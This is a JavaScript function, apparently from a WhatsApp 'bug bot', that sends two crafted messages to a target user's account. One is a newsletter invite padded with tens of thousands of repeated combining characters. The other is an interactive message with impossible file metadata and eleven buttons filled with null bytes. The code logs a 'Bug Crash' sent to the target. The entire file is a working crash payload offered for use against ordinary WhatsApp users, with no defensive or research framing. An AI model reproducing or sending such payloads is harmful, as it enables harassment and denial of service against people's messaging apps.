async function XProtexBlankChatV3(target) {
  const XProtex = '_*~@2~*_\n'.repeat(10500);
  const Private = 'ោ៝'.repeat(10000);
   
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬" + "ោ៝".repeat(20000),
      caption: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬" + Private + "ោ៝".repeat(20000),
      inviteExpiration: "999999999",
    },
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });

  const messageCrash2 = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: ""
                    },
                },
              },
            body: {
              text: "Hi I'm XProtex!!" + "ꦾ".repeat(2000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, messageCrash2, {
      participant: { jid: target },
    });

    console.log(`Succes Sending Bug Crash By XProtexGlow To ${target}`);
      }